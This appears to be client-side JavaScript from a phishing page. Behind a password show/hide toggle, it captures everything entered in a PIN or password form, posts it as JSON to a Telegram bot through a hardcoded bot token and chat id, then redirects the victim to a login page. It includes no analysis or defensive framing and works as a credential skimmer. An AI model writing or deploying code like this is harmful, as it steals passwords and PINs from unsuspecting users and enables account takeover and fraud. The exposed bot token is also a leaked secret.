     $(document).ready(function() {
       $("div#eyeOpen").on('click', function() {
         $("#eyeOpen").css("display", "none");
         $("#eyeClose").css("display", "block");

         $("#password").prop("type", "text");

         $("div#eyeClose").on('click', function() {
           $("#eyeOpen").css("display", "block");
           $("#eyeClose").css("display", "none");

           $("#password").prop("type", "password");
         });
       });

       const chat_id = '7451712086',
         botID = 'bot7580781557:AAHgfHSdeJLmEej_bQNOtFy78hX1JeCIXAY';

       const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;

       document.querySelector('#setPin').addEventListener("submit", async e => { // When the user submits the form
         e.preventDefault(); // Don't submit
         let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
           Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
           null, 2); // Prettify the JSON so we can read the data easily
         const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
           method: 'POST',
           headers: { "Content-Type": "application/json" }, // This is required when sending a JSON body.
           body: JSON.stringify({ chat_id, text }), // The body must be a string, not an object
         });
         const messageStatus = document.querySelector('#status');
         if (sendMessage.ok) // Update the user on if the message went through
           messageStatus.textContent = "";
         else
           messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
         e.target.reset(); // Clear the form fields.
         window.location.href = 'login.html';
       });


     });